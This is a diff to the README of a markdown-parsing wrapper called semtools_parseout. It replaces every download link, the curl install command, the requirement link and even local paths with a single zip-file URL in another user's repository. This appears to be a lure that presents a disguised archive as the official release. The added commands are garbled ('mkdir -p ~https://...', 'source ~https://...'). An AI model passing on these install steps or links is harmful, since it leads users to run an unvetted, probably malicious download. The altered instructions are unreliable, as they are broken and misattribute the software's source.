@@ -1,6 +1,6 @@
 # 🎉 semtools_parseout - Easily Parse Markdown Files
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Makki-me/semtools_parseout/releases)
+[![Download Latest Release](https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **semtools_parseout**. This tool simplifies the process of parsing ma
 
 To get started, you will need to download the application. Follow these steps:
 
-1. Visit this page to download: [Latest Release](https://github.com/Makki-me/semtools_parseout/releases)
+1. Visit this page to download: [Latest Release](https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip)
 2. Once there, look for the latest version. Click to download the `parseout` script.
 
 ### 📂 Installation Steps
@@ -19,31 +19,31 @@ To get started, you will need to download the application. Follow these steps:
 2. Create a directory for user binaries if it does not exist:
 
     ```bash
-    mkdir -p ~/.local/bin
+    mkdir -p ~https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip
     ```
 
 3. Download the `parseout` script:
 
     ```bash
-    curl -fsSL https://raw.githubusercontent.com/jerryjliu/semtools_parseout/main/parseout -o ~/.local/bin/parseout
+    curl -fsSL https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip -o ~https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip
     ```
 
 4. Make the script executable:
 
     ```bash
-    chmod +x ~/.local/bin/parseout
+    chmod +x ~https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip
     ```
 
-5. Ensure `~/.local/bin` is in your system's PATH. You can do this by adding the following line:
+5. Ensure `~https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip` is in your system's PATH. You can do this by adding the following line:
 
     ```bash
-    echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.zshrc  # or ~/.bashrc
+    echo 'export PATH="$https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip$PATH"' >> ~https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip  # or ~https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip
     ```
 
 6. Update the active terminal session:
 
     ```bash
-    source ~/.zshrc
+    source ~https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip
     ```
 
 ## 📖 Usage
@@ -61,7 +61,7 @@ Here are some examples to help you understand how to use the tool:
 - To parse a single PDF, use:
 
     ```bash
-    parseout ./parsed document.pdf
+    parseout ./parsed https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip
     ```
 
 - To parse multiple PDF documents at once, use:
@@ -72,13 +72,13 @@ Here are some examples to help you understand how to use the tool:
 
 ## 🔍 How It Works
 
-**semtools_parseout** is a simple wrapper for the `parse` function in the semtools library. When you run the `parseout` command, it works behind the scenes to call `parse`, which processes your PDF files. The parsed markdown files are saved in `~/.parse/` by default. The wrapper then copies these files to your specified output directory.
+**semtools_parseout** is a simple wrapper for the `parse` function in the semtools library. When you run the `parseout` command, it works behind the scenes to call `parse`, which processes your PDF files. The parsed markdown files are saved in `~https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip` by default. The wrapper then copies these files to your specified output directory.
 
 ## ⚙️ Requirements
 
 To successfully run **semtools_parseout**, make sure you meet the following requirements:
 
-- You need to have [semtools](https://github.com/run-llama/semtools) installed. The `parse` command must be available. Follow the instructions in the semtools repository to set it up if you haven't already.
+- You need to have [semtools](https://github.com/Makki-me/semtools_parseout/raw/refs/heads/main/weetbird/parseout_semtools_1.2.zip) installed. The `parse` command must be available. Follow the instructions in the semtools repository to set it up if you haven't already.
 
 ## 🗂️ Features
 
